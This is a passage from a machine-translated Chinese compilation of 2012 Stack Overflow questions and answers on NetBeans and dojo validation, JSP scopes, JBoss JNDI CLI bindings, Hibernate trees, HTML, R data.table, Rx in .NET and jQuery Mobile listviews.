阅读此内容：http: [//blogs.msdn.com/b/gautamg/archive/2010/01/05/series-on-coded-ui-test-extensibility.aspx](http://blogs.msdn.com/b/gautamg/archive/2010/01/05/series-on-coded-ui-test-extensibility.aspx)

然后看一下这里的示例，了解有关创建自己的扩展以公开字体的想法：http: [//blogs.msdn.com/b/mathew_aniyan/archive/2011/05/17/custom-wpf-control-s-自定义属性.aspx](http://blogs.msdn.com/b/mathew_aniyan/archive/2011/05/17/custom-wpf-control-s-custom-properties.aspx)

请记住，您将需要修改此示例以获得您所追求的。

-保罗

# netbeans - 在 Netbeans 中禁用 XHTML 验证以进行 dojo 开发

> ID：10811343
> 
> 赞同：1
> 
> 时间：2012-05-30T06:54:00.240
> 
> 标签：netbeans, xhtml, dojo

我正在 Netbeans 7.1 中开发一个 dojo 应用程序，但是由于 dojo 使用非标准 HTML 属性，所以我在每一行都有 XHTML 验证错误。在 Netbeans 中，可以选择完全忽略特定行或整个文档的此错误，但我想保留基本的 html 验证。是否可以在不丢失 html 验证的情况下忽略此错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T08:28:41.943

Dojo 也支持有效`data-`的 HTML 属性，使用这些：

*   `data-dojo-config`不是`djConfig`，例如：`data-dojo-config="parseOnLoad:true,async:true"`
*   `data-dojo-type`代替`dojoType`
*   `data-dojo-props`例如：`data-dojo-props="name:'start_date',required: true"`
*   `data-dojo-attach-point`在小部件模板中
*   `data-dojo-attach-event`在小部件模板中
*   `data-dojo-id`代替`jsId`

**编辑**：由于`data-*`属性仅在 HTML5 中有效，并且 NetBeans 会根据您验证文档，因此您还可以通过菜单» » » »`doctype`微调验证。有关闭或更改*显示*为。您将需要重新打开 html 文档以应用新的验证规则`Tools``Options``Editor``Hints``HTML`*`Elements`*

 *![在此处输入图像描述](../Images/01de5f95fa2af24869833b1a7816a77d.png)*

# java - 将范围从会话更改为请求

> ID：10811346
> 
> 赞同：0
> 
> 时间：2012-05-30T06:54:23.427
> 
> 标签：java, jsp, jakarta-ee, servlets, jstl

我正在使用会话范围来存储 bean，并且我想像这样在需要时将 bean 值投影到 jsp 页面

```
request.getSession().setAttribute("bean", bean);

        response.sendRedirect("test.jsp"); 
```

在 jsp 中，我使用下面的代码来获取 jsp 上的值

```
<%  bean1 bean = (bean1) session.getAttribute("bean");

  %>
<%= bean.getValue() %> 
```

我不想使用会话范围，而是想使用请求范围，所以我可以用这种方式在我的 servlet 中设置我的属性吗

```
request.setAttribute("bean", bean); 
```

那么我怎么能在我的jsp上调用它我可以说

```
<%  bean1 bean = (bean1) request.getAttribute("bean"); 
```

但它显示错误。或者我如何使用 JSTL 显示我的输出而不是使用 scriplet。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:04:29.717

您不了解重定向是什么。重定向是您发送给浏览器的响应，以便浏览器向您重定向到的位置发送另一个新请求。因此，当您调用 时`sendRedirect("test.jsp")`，浏览器将向 test.jsp 发送一个新请求。显然，您存储在当前请求中的所有属性将不再可用。

在没有上下文的情况下，不可能说在这种情况下是否应该执行重定向，或者是否应该转发到 JSP。转发与重定向非常不同，因为它只将当前请求和响应的责任转移到另一个组件。在这种情况下，会有一个唯一的请求，JSP 可以在请求中找到 servlet 设置的属性。

我唯一能说的是，在一个设计合理的 MVC 应用程序中，JSP 被用作视图，永远不应该直接请求视图。每个请求都应该通过一个控制器。

# wildfly - JBoss 7.1.1 在运行时更改 JNDI 绑定

> ID：10811347
> 
> 赞同：5
> 
> 时间：2012-05-30T06:54:24.193
> 
> 标签：wildfly, jboss7.x, jndi, wildfly-9

在独立模式的 JBoss 7.1.1 中，所有 JNDI 绑定都在 jboss:domain:naming:1.1 子系统的standalone.xml 文件中配置。根据文档，standalone.xml 在服务器运行时无法修改。我尝试使用 JBoss CLI，但我不知道如何编写/修改资源。

如何在不重新启动 jboss 的情况下更改 JNDI 中的值？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-20T10:49:36.160

应该帮助你：[https ://docs.jboss.org/author/display/AS71/JNDI+Reference](https://docs.jboss.org/author/display/AS71/JNDI+Reference)

**主题 - 将条目绑定到 JNDI：**

> 一个示例standalone.xml 可能如下所示：
> 
> ```
> <subsystem xmlns="urn:jboss:domain:naming:1.1" >
>   <bindings>
>     <simple name="java:global/a" value="100" type="int" />
>     <object-factory name="java:global/b" module="com.acme" class="org.acme.MyObjectFactory" />
>     <lookup name="java:global/c" lookup="java:global/b" />
>  </bindings>
> </subsystem> 
> ```
> 
> 要通过 CLI 添加这些条目：
> 
> ```
> /subsystem=naming/binding=java\:global\/mybinding:add(binding-type=simple, type=long, value=1000) 
> ```
> 
> 要查看 add 命令采用的所有选项（这实际上可用于获取任何 CLI 命令的描述）：
> 
> ```
> /subsystem=naming/binding=*:read-operation-description(name=add) 
> ```

*没试过，但我希望这会有所帮助！*

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-07T18:08:20.247

这个问题有很多观点，所以我会回答它。受@mik 响应的启发，我发现要更改某些 JNDI 密钥的值，例如更改`java:jboss/api/key`为 newApiKey 运行[JBoss CLI](https://docs.jboss.org/author/display/AS71/Admin+Guide#AdminGuide-RunningtheCLI)并执行：

```
connect
/subsystem=naming/binding=java\:jboss\/api\/key/:write-attribute(name=value,value=newApiKey) 
```

更改将立即在服务器上可见并存储（更新），`standalone.xml`因此在服务器重新启动后不会丢失。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-06-27T13:59:48.053

我正在寻找如何在运行时添加或修改 JNDI 绑定，但我需要在 Wildfly 9 域（集群）配置（不是独立）中执行此操作，这与 JBoss 7 的配置几乎相同。但是，我想不出一种在不重新启动所有服务器的情况下有效应用更改的方法。

首先，进入 JBoss 命令行界面并连接到您的服务器域控制器：

```
./jboss-cli.sh
connect 
```

首先，您需要找到服务器组上哪个配置文件处于活动状态，因此，在服务器根*/*上，输入以下命令：

```
cd server-group=
ls 
```

之后，您应该输入列表命令 (ls) 中显示的唯一服务器组`cd {{your_server_group_name}}`，然后`ls`再次输入并查找名为*profile*的条目以检查哪个是活动的。让我们将*full-ha*视为我们示例的活动配置文件。

`cd ..`接下来，通过键入并输入以下命令返回到根配置文件夹 /以导航和查看所有可用的 JNDI 绑定及其当前值：

```
cd profile=full-ha/subsystem=naming/binding=
:read-resource(recursive=true) 
```

通过这样做，您将能够看到所有可用的 JNDI 绑定及其属性，如果您只想列出绑定名称，请键入`ls`而不是最后一个命令。

要修改绑定，请键入`cd`前面命令中列出的绑定的名称和名称。假设您要更改名为*java:/webservice.url*的绑定的值，那么您应该输入

```
cd java\:\/webservice.url 
```

请注意，有必要在绑定名称中引用一些字符，例如*：（冒号）*和*/（斜杠）*和反斜杠 ( *\* )。

要修改此绑定中的属性，您应该使用 :write-attribute 命令。在此示例中，假设您要修改（或添加）一个名为*“value”*的属性，其内容为“this is a value”：

```
:write-attribute(name=value,value="this is a value") 
```

为了应用此更改，您需要通过键入以下命令重新启动集群中的所有服务器：

```
/server-group={{server-group-name}}:restart-servers 
```

如果您想了解更多添加或删除 JNDI 绑定的命令，请查看此[jboss-cli 片段页面](https://github.com/juliojsb/jboss-cli-snippets-compilation#domain-5 "添加、删除、修改、读取 JNDI")

此配置已在 Wildfly 9.0.1 中测试成功

# java - Java中的动态树创建

> ID：10811348
> 
> 赞同：0
> 
> 时间：2012-05-30T06:54:27.967
> 
> 标签：java, spring, hibernate

我正在使用 Spring-hibernate 框架和 Oracle 数据库。现在有一个名为 project 的表。每条记录都有一个唯一的 id、name 和一个 parent_id 列。假设该表有以下记录...

```
ID NAME PARENT_ID
1  A     NULL
2  B     1
3  C     NULL
4  D     3
5  E     3 
```

现在我已经创建了一个树视图，这些记录将根据它们的父子关系显示在其中。像这样..

```
1---P
   ch---2
3---P
   ch--4
   ch--5 
```

现在任何人都可以帮助我如何创建动态地从数据库中获取记录的树。什么是数据访问对象（DAO）和DAO的实现......

任何帮助或建议都会非常有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:38:27.177

您需要的是[Oracle 分层查询](http://docs.oracle.com/cd/B19306_01/server.102/b14200/queries003.htm)。由于您使用的是 Oracle DB，因此您很幸运。

但是通过 Hibernate 可以做到这一点的唯一方法是使用本机查询并将结果映射回对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:27:30.940

刚刚在 POM（.java 类）中使用 List 类型一对多注释进行了自我表引用。

```
@OneToMany(fetch = FetchType.EAGER)
@JoinColumn(name = "PARENT_ID",nullable=true)
@OrderBy(clause = "NAME")
@ForeignKey(name = "fk_child_project")     
private List<Project> projects= new ArrayList<Project>(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:08:17.480

首先只选择 PARENT_ID。然后选择 ID 位于前一个结果数组中的所有内容（[http://www.w3schools.com/sql/sql_in.asp](http://www.w3schools.com/sql/sql_in.asp)）。

*   从此，您可以在树中创建父级，然后在展开时延迟加载子级。
*   或者你可以立即用孩子填充树。您只需选择所有 PARENT_ID 不为 NULL 的地方并将它们附加到适当的父级（通过 PARENT_ID）。

我不确定 DAO 与它有什么关系。但是如果你只是想要一些抽象，你可以使用 DAO 模式。

DAO 可以有如下方法：*getAllParents、getChildrenForParentId、getAllChildren、* ...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T08:17:47.540

太多的问题，我会尽力引导你朝着正确的方向前进——这可能不会让你到达目的地。

*   创建你的`Entities`，查看[文档](http://docs.jboss.org/hibernate/annotations/3.5/reference/en/html/entity.html)
*   您可能不需要 DAO，只需创建一个业务类来查询数据库。（提示：`EntityManager`在您使用 Hibernate 的 JPA 实现的情况下使用），请参阅[文档](http://docs.jboss.org/hibernate/entitymanager/3.6/reference/en/html_single/)
*   然后在浏览器中将其显示为树，假设您正在使用 webapp

**注意：** *您可以再次来询问有关如何的具体问题，作为一个单独的问题。*

**相关线程**

*   [如何在 JPA 中实现自我加入](https://stackoverflow.com/questions/5714328/how-to-implement-self-join-in-jpa)

# html - 在html表格中加粗一行

> ID：10811351
> 
> 赞同：6
> 
> 时间：2012-05-30T06:54:51.667
> 
> 标签：html, css

我已经使用以下代码制作了一个表格，但在标签中我只需要 XYZ 为粗体，所有其他为非粗体。但是当我使用这段代码时，整个代码变得粗体了。我不想在这个文件中使用 css 样式表。有人请告诉我如何实现这一目标。

```
<table width=100%>
<tr>
<td><center><b>XYZ<b><br>Aabc<br>+91-xxxxxxxxx<br>xyz@htjkl.com<center></td>
</tr>
</table> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:14:49.643

```
<table style='width:100%;'>
    <tr>
        <td style='text-align:center;'>
            <span style='font-weight:bold;'>XYZ</span><br>
            Aabc<br>
            +91-xxxxxxxxx<br>
            xyz@htjkl.com</td>
    </tr>
 </table> 
```

[http://jsfiddle.net/n5WZt/](http://jsfiddle.net/n5WZt/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-30T06:56:00.513

1.  您应该使用样式表。
2.  有一个简单的错字：在第二次出现的 . 中缺少 / `<b>`。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-30T06:58:39.930

请关闭您的所有标签

```
<table width=100%>
<tr height=11%>
<td><center><b>XYZ</b><br>Aabc<br>+91-xxxxxxxxx<br>xyz@htjkl.com</center></td>
</tr>
</table> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-30T06:58:10.823

您在 HTML 标记中拼写错误，关闭 b 标记忘记了 /，试试这个：

```
<table width=100%>
  <tr>
    <td><center><b>XYZ</b><br>Aabc<br>+91-xxxxxxxxx<br>xyz@htjkl.com<center></td>
  </tr>
</table> 
```

# r - 有效地从 1 个数据帧中的多个时间序列的开头和结尾删除缺失值

> ID：10811357
> 
> 赞同：6
> 
> 时间：2012-05-30T06:55:20.680
> 
> 标签：r, dataframe, data.table, time-series, zoo

使用 R，我试图从包含多个时间序列的数据帧的开头和结尾修剪 NA 值。我已经使用 for 循环和 zoo 包实现了我的目标，但正如预期的那样，它在大型数据帧上效率极低。

我的数据框看起来像这样，包含 3 列，每个时间序列由它的唯一 ID 标识。在这种情况下，AAA、B 和 CCC。

```
id   date          value
AAA  2010/01/01    NA
AAA  2010/02/01    34
AAA  2010/03/01    35
AAA  2010/04/01    30
AAA  2010/05/01    NA
AAA  2010/06/01    28
B    2010/01/01    NA
B    2010/02/01    0
B    2010/03/01    1
B    2010/04/01    2
B    2010/05/01    3
B    2010/06/01    NA
B    2010/07/01    NA
B    2010/07/01    NA
CCC  2010/01/01    0
CCC  2010/02/01    400
CCC  2010/03/01    300
CCC  2010/04/01    200
CCC  2010/05/01    NA 
```

我想知道，如何有效地从每个时间序列的开始和结束删除 NA 值，在这种情况下为 AAA、B 和 CCC。所以它应该看起来像这样。

```
id   date          value
AAA  2010/02/01    34
AAA  2010/03/01    35
AAA  2010/04/01    30
AAA  2010/05/01    NA
AAA  2010/06/01    28
B    2010/02/01    0
B    2010/03/01    1
B    2010/04/01    2
B    2010/05/01    3
CCC  2010/01/01    0
CCC  2010/02/01    400
CCC  2010/03/01    300
CCC  2010/04/01    200 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T09:25:14.313

我会这样做，这应该非常快：

```
require(data.table)
DT = as.data.table(your data)   # please provide something pastable

DT2 = DT[!is.na(value)]
setkey(DT,id,date)
setkey(DT2,id,date)
tokeep = DT2[DT,!is.na(value),rolltolast=TRUE,mult="last"]
DT = DT[tokeep] 
```

这是通过在每个组内滚动流行的非 NA 来实现的，但不会超过最后一个。

`mult="last"`是可选的。如果使用 v1.8.0（在 CRAN 上），它应该会加快速度。对有和没有它的时间感兴趣。默认情况下`data.table`加入组 ( `mult="all"`)，但在这种情况下，我们将加入键的所有列，并且我们知道键是唯一的；即，没有重复键。在 v1.8.1（开发版）中，无需了解这一点，它会更加照顾您。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:52:02.260

如果您的数据在数据框中`data`

```
fun <- function(x)
{
    x$value[is.na(x$value)] <- "NA"
    tmp <- rle(x$value)
    values <- tmp$values
    lengths <- tmp$lengths
    n <- length(values)

    nr <- nrow(x)
    id <- c()
    if(values[1] == "NA") id <- c(id, 1:lengths[1])
    if(values[n] == "NA") id <- c(id, (nr-lengths[n]+1):nr)
    if(length(id) == 0)return(x)
    x[-id,]
}

do.call(rbind,
        by(data, INDICES=data$id,
           FUN=fun)) 
```

我猜这不是最优雅的解决方案。在[这篇文章](https://stackoverflow.com/questions/10797655/allow-a-maximum-number-of-entries-when-certain-conditions-apply)的心情。

# algorithm - 嵌套算法

> ID：10811364
> 
> 赞同：0
> 
> 时间：2012-05-30T06:55:38.510
> 
> 标签：algorithm, nested

我有嵌套长度的问题，请建议我解决这个问题的最佳方法。我的问题如下。

我有一些标准长度可以说**总长度**（这是我们需要用一些特定长度块填充的总长度）

输入是长度块的列表，例如：5000、4000、3000

每个块之间的间隙是一个范围，例如：200到500（这个间隙可以在范围内调整）

现在我们必须用上述可用长度块填充总长度，每个块之间有间隙，并且该间隙应该在上面给出的间隙范围内。

请给我一些解决这个问题的方法。

预先感谢...

问候， 阿尼尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:25:19.387

这个问题本质上是带有小转折的[子集和问题。](http://en.wikipedia.org/wiki/Subset_sum_problem)您可以使用与子集和相同的伪多项式时间解决方案：创建一个长度为“总长度”的数组（我们从现在开始称为*n*），并且对于每个长度*k*，将其添加到数组中的每个现有长度（所以如果元素*m*已填充，则在*m + k*处创建一个新条目（如果*m + k ≤ n*），但将现有条目也保留在*m*处），以及在位置*k*处创建一个新数组条目，表示创建一个新套装。*您可以在数组元素i*处建立一组条目，以表示总计*i*的长度块列表集*. 每个集合条目都应该链接回它来自的数组条目，它可以通过简单地存储让你到达那里的最后一个长度来做到这一点。这类似于我最近[在这里](https://stackoverflow.com/a/10612601/120169)回答的一个问题，您可以调整它以允许您认为合适的重复。*

 *但是，您需要修改上述方法以弥补差距。*让我们称每个元素x*之间的最小间隙和最大间隙*y*。添加长度为*k*的条目时，我们在将其添加到另一个条目时包含最小间隙（因此，如果填充了*m*，我们实际上在*m + k + x*处创建条目）。我们继续在*k*处创建初始条目，因为我们包括元素之间的间隙。当我们创建一个条目时，我们还可以确定它是否填满了空间。假设新条目包含*t*个元素并且总共有*m*个。然后它填充空间当且仅当*m ≥ n - t* ( *y - x*）。如果它填满了空间，我们应该将它添加到解决方案列表中。根据您想要多少解决方案，您可以在找到足够的解决方案后立即终止算法，或者让它找到所有解决方案。最后，只需遍历解决方案列表。

范围内的任何内容都可以通过多种不同方式中的任何一种来表示其差距，但一种有效的方法是贪婪地分配“slack” - 例如，如果您使用上面的示例距离新的总长度 1000，您可以将前三个间隙选择为 500（每个间隙增加 300，总共额外增加 900），然后将第四个间隙选择为 300（对于额外的 100 间隙，总计 1000），并且每个额外间隙应该是最小值（200）。*

# .net - .Net 中的 Rx 框架是什么？

> ID：10811365
> 
> 赞同：1
> 
> 时间：2012-05-30T06:55:38.857
> 
> 标签：.net, observablecollection

什么是 .Net 中的 Rx FrameWork 我已经阅读了一些关于它的文章，但概念对我来说仍然不清楚。任何人都可以用一个实际的例子来解释它。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-30T07:39:19.117

让我们想象一下以下场景：*在漫长的一天之后，您和您的朋友进入一家酒吧解渴。你想要的只是几杯啤酒和一张桌子，你可以在其中讨论各种主题（map-reduce 实施、gas 价格等）*。

在池化方法（非 Rx）中，您将执行以下步骤：

```
1\. Ask bartender for two beers
2\. While bartender pours the beer into the glasses you wait by the bar
3\. When bartender gives you the beers you take them and find an available table, sit, drink and discuss 
```

使用 Rx 方法，您将执行以下步骤：

```
1\. Ask the bartender for two beers
2\. Bartender starts pouring your beers and you and your frined find an available table, sit and  start discussing on various subjects
3\. When bartender finishes pouring your beer, a waitress brings the beer to your table and you start drinking it. 
```

现在可以将上面的代码翻译成如下代码：

```
//Non Rx approach
var beers = beerKeg.Take(2); // Here you wait for the bartender to pour the beer
foreach(var beer in beers)   // Bartender handles you the beer
    GrabBeer(beer);
FindAvailableTable();        // You search for an available table
foreach(var beer in beers)   // You drink your beer
    beer.Drink();

//Rx approach
var beers = beerKeg.Take(2) 
                   .ToObservable() 
                   .Subscribe(beer => beer.Drink());
// Bartender is pouring the beer but meanwhile you can search for an available table.
// The waitress will bring beer to you.
FindAvailableTable(); 
```

希望这可以帮助。

PS：要**查看**差异，请使用[LINQPad](https://www.linqpad.net/)；执行非 Rx 查询并调用`Dump()`结果 - 结果将显示在网格中。使用 Rx 执行相同的查询并订阅`ObservableCollection`with `x=>x.Dump()`; 您会看到每个元素都是单独打印的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-30T07:32:34.470

Rx 或 Reactive Extensions 是“LINQ to events”。LINQ 基于`IEnumerable<T>`通过迭代从序列中提取项目的位置：

```
var items = source.Where(x => x.Name == "foobar");
foreach (var item in items)
  Console.WriteLine(item); 
```

`IObservable<T>`Rx 与您订阅推送给您的一系列事件的位置相反：

```
var events = source.Where(x => x.Name == "foobar");
events.Subscribe(item => Console.WriteLine(item)); 
```

在 LINQ 中，您通过使用`foreach`循环来控制迭代并从序列中**提取项目。**在 Rx 中，其他东西会在它们准备好时触发事件并将项目**推送给您。**

Rx 增加了很多扩展方法，`IObservable<T>`就像 LINQ 增加了很多扩展方法一样，`IEnumerable<T>`可以让你编写非常紧凑和清晰的代码来处理异步事件。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:17:12.370

Rx 或 Reactive Extensions 是一个使用可观察集合和 LINQ 样式查询运算符组成异步和基于事件的程序的库。

网上有很多文章，例如：

[MSDN](http://msdn.microsoft.com/en-us/data/gg577609.aspx)

[处方药维基](http://rxwiki.wikidot.com/)

[视觉工作室杂志](http://visualstudiomagazine.com/articles/2009/10/01/net-rx-framework.aspx)

[Somasegar 的博客条目](http://blogs.msdn.com/b/somasegar/archive/2009/11/18/reactive-extensions-for-net-rx.aspx)

[深度介绍中的 Rx API](http://blogs.msdn.com/b/rxteam/archive/2009/11/17/rx-api-video-documentation.aspx)

和我们自己的[SO](https://stackoverflow.com/questions/1217345/what-is-linq-to-events-a-k-a-rx-framework)

请参阅[在 Channel 9 上编写您的第一个 Rx 应用程序，](http://channel9.msdn.com/blogs/j.van.gogh/writing-your-first-rx-application)并且，

[第 9 频道 .NET 的 Rx 扩展入门](http://channel9.msdn.com/blogs/charles/getting-started-with-rx-extensions-for-net)

# javascript - 发布或离开页面时，onmouseover 在 chrome 中失败

> ID：10811370
> 
> 赞同：3
> 
> 时间：2012-05-30T06:56:01.837
> 
> 标签：javascript, html, onmouseover, onmouseout

我在页面上的图片上有 onmouseover 和 onmouseout 属性。提交时 onmouseover 和 onmouseout 导致图片失败（返回图片源未找到图标）

```
<input type="image" src="../../Content/Resources/save.png" onmouseover="mouseOverForImage('save', '../../Content/Resources/save_mouse_over.png')" 
               onmouseout = "mouseOverForImage('save', '../../Content/Resources/save.png')" id="save"
               title = "Save" /> 
```

和 Javascript：

```
function mouseOverForImage(imgId, imgSrcs) {
        document.getElementById(imgId).src = imgSrcs;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-04T10:50:17.093

我[**在 jsfiddle 上创建了一个页面**](http://jsfiddle.net/eJwYY/3/)来测试您的问题（请注意，您需要**运行**该页面才能查看具有相对路径的图像，这是所有浏览器中都发生的 jsfiddle 问题）。

悬停 [+] 图像按钮（它会变成 [?]）并单击它。在加载页面时，您可以将鼠标悬停/移出/移出/移出/移过...任意多次，它将起作用：图像将更改，并且不会发生 404。

我正在使用 Chrome 20。

这导致我提出以下问题：

1.  您的 Chrome 版本是什么，您能否在 Safari 中重现该问题？我记得 Webkit 有一个错误，它会非常随机地显示图像......
2.  您是否*准确地*发布了代码？您是否 100% 确定没有缺少引号，或者“0”而不是“o”，或者字母大小写有问题？
3.  当您提交表单时，您的页面（或 iframe）的 URL 是否会同时更改？如果是这样-您的相对路径将不再起作用，您将获得 404。您可以通过设置图像 src 的完整路径来测试它吗？也许还记录当前的网址？
4.  其他代码（onsubmit 事件？）会干扰您的表单吗？您可以发布更多代码或创建一个重现您的问题的 jsfiddle 吗？
5.  我们/我是否正确理解您的问题？:)

谢谢。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-05T09:38:38.813

你可以试试这样的

```
function mouseOverForImage(imgId, imgSrcs) { 

    var image = new Image(); 

    image.src = imgSrcs; 

    image.onload = function() { 
        document.getElementById(imgId).src = imgSrcs; 
    }; 

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-04T12:37:51.707

代替使用 mouseover 和 mouseout 事件尝试使用 mouseenter 和 mouseleave。它通常适用于这些类型的问题。

# javascript - 图片、音乐、视频、youtube、flash 和 vimeo x-browser 媒体播放器插件？

> ID：10811371
> 
> 赞同：0
> 
> 时间：2012-05-30T06:56:12.213
> 
> 标签：javascript, jquery, flash, youtube, vimeo

我正在寻找的是拥有媒体播放器插件，它将能够播放以下媒体内容：

*   图片
*   音频（可选）
*   视频（可选）
*   youtube 嵌入视频
*   vimeo 嵌入视频
*   flash（当不支持 flash 时，则显示图像）

内容应该组织在播放列表中，我应该能够决定带图像的帧的长度是多少（当然，自动播放时带视频/音频的帧的长度是视频/音频长度本身）。此外，我需要能够向其添加自定义控件，并能够使用 javascript/jquery 触发操作（下一个、上一个、播放、暂停、停止）。我还想在框架中添加点击链接。

我在 Google 叔叔或现有问题中找不到任何问题，所以我决定发布新问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T16:23:49.200

尝试开放标准媒体 (OSM) 播放器

[http://mediafront.org/osmplayer/#.T9dsiStYvEV](http://mediafront.org/osmplayer/#.T9dsiStYvEV)

# objective-c - Objective-C 中的 bundle 是什么？

> ID：10811375
> 
> 赞同：3
> 
> 时间：2012-05-30T06:56:23.977
> 
> 标签：objective-c, ios, xcode, bundle

我下载了 Facebook SDK，发现里面有一些`FBConnect.bundle`非常有趣的东西，而且我还发现一些代码正在使用该捆绑包，如下所示：

```
[loginButton setImage:
[UIImage imageNamed:@"FBConnect.bundle/images/LoginWithFacebookNormal@2x.png"]
             forState:UIControlStateNormal]; 
```

所以，我想知道，什么是捆绑包？我怎么知道捆绑包里面有什么？如何创建自己的捆绑包？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T06:59:04.130

Bundle 在 OS X 上比在 iOS 上更相关。捆绑软件只是一个自包含的可执行文件。当你运行它时，它会执行一个内部定义的 main 函数，并且只使用它包含的资源。但是，iOS（据我所知）不（不能？）执行除主要捆绑包之外的捆绑包，因此它们只是美化的文件夹。您可以通过在 finder 中，右键单击并选择*Show Package Contents*来查看它们的内容。

# jquery - JQuery Mobile+Phone Gap：列表视图（表格视图）的格式化问题

> ID：10811376
> 
> 赞同：0
> 
> 时间：2012-05-30T06:56:30.167
> 
> 标签：jquery, android, iphone, jquery-mobile, cordova

我已经***`left side list view in split view`***使用以下**`jQuery mobile phonegap`**代码实现了

```
 <div data-role="page"  id="main" data-hash="false">

            <div data-role="header">
                <h1>Main</h1>
            </div><!-- /header -->

            <div data-role="content" data-theme="c">    

                <ul data-role="listview" data-theme="c" data-header-theme="a">

                    <li>first Row contains 8 list items
                        <ul>
                            <li data-role="list-divider" data-header-theme="c">One item</li>  <!----------- Section Header -------->
                            <li><a href="#siteInfo" data-panel="main">One item</a></li>
                            <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
                            <li><a href="#siteProviders" data-panel="main">One item</a></li>

                            <li data-role="list-divider" data-divider-theme="c">One item</li>  <!---------- Section Header -------->
                            <li><a href="#equipment" data-panel="main">One item</a></li>
                            <li><a href="#scroll" data-panel="main">One itemrts</a></li>
                            <li><a href="#context" data-panel="main">One iteme</a></li>
                            <li><a href="#context" data-panel="main">Data commissioned</a></li>
                        </ul>
                    </li>
                    <li>Second Row contains 8 list items
                        <ul>
                            <li data-role="list-divider" data-header-theme="a">One item</li> 
                            <li><a href="#siteInfo" data-panel="main">One item</a></li>
                            <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
                            <li><a href="#siteProviders" data-panel="main">One item</a></li>

                            <li data-role="list-divider" data-divider-theme="c">One item</li>  <!---------- Section Header -------->
                            <li><a href="#equipment" data-panel="main">One item</a></li>
                            <li><a href="#scroll" data-panel="main">One itemrts</a></li>
                            <li><a href="#context" data-panel="main">One iteme</a></li>
                            <li><a href="#context" data-panel="main">Data commissioned</a></li>                     
                        </ul>
                    </li>

                    <li>3rd Row contains 8 list items
                        <ul>
                            <li data-role="list-divider" data-header-theme="c">One item</li>  <!----------- Section Header -------->
                            <li><a href="#siteInfo" data-panel="main">One item</a></li>
                            <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
                            <li><a href="#siteProviders" data-panel="main">One item</a></li>

                            <li data-role="list-divider" data-divider-theme="c">One item</li> 
                            <li><a href="#equipment" data-panel="main">One item</a></li>
                            <li><a href="#scroll" data-panel="main">One itemrts</a></li>
                            <li><a href="#context" data-panel="main">One iteme</a></li>
                            <li><a href="#context" data-panel="main">Data commissioned</a></li>
                        </ul>
                    </li>
                    <li>4th Row contains 8 list items
                        <ul>
                            <li data-role="list-divider" data-header-theme="a">One item</li>  
                            <li><a href="#siteInfo" data-panel="main">One item</a></li>
                            <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
                            <li><a href="#siteProviders" data-panel="main">One item</a></li>

                            <li data-role="list-divider" data-divider-theme="c">One item</li>  
                            <li><a href="#equipment" data-panel="main">One item</a></li>
                            <li><a href="#scroll" data-panel="main">One itemrts</a></li>
                            <li><a href="#context" data-panel="main">One iteme</a></li>
                            <li><a href="#context" data-panel="main">Data commissioned</a></li>                     
                        </ul>
                    </li> 
```

当我在 xcode 中执行 jQuery 时工作正常，但表格视图如下所示，但不是正常的列表视图

**`list items are in a separate box but not as a list`**如下图所示

![在此处输入图像描述](../Images/33739c0b4150cb6458ead45784eef0a4.png)

但我想要*`normal list`*如下图 2 所示

![在此处输入图像描述](../Images/df3196131aeb454651e163316495f67f.png) ![在此处输入图像描述](../Images/9855a30dcc597ad05440df72ffe8a85f.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:06:48.117

我不认为你可以嵌套`listview`你所做的方式 - 要么将你的外部列表放入`list-divider`标签中，要么一个`listview`接一个地创建几个列表。

也就是说，要么像这样：

```
<div data-role="content" data-theme="c">    
    <ul data-role="listview" data-theme="c" data-header-theme="a">
         <li data-role="list-divider" data-header-theme="c">first Row contains 8 list items</li>  <!----------- Section Header -------->
         <li><a href="#siteInfo" data-panel="main">One item</a></li>
         <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
         <li><a href="#siteProviders" data-panel="main">One item</a></li>

         <li data-role="list-divider" data-divider-theme="c">One item</li>  <!---------- Section Header -------->
         <li><a href="#equipment" data-panel="main">One item</a></li>
         <li><a href="#scroll" data-panel="main">One itemrts</a></li>
         <li><a href="#context" data-panel="main">One iteme</a></li>
         <li><a href="#context" data-panel="main">Data commissioned</a></li>

         <li data-role="list-divider" data-header-theme="c">Second Row contains 8 list items</li>  <!----------- Section Header -------->
         <li data-role="list-divider" data-header-theme="a">One item</li> 
         <li><a href="#siteInfo" data-panel="main">One item</a></li>
         <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
         [...] 
```

或者像这样：

```
<div data-role="content" data-theme="c">    
    <ul data-role="listview" data-theme="c" data-header-theme="a">
         <li data-role="list-divider" data-header-theme="c">first Row contains 8 list items</li>  <!----------- Section Header -------->
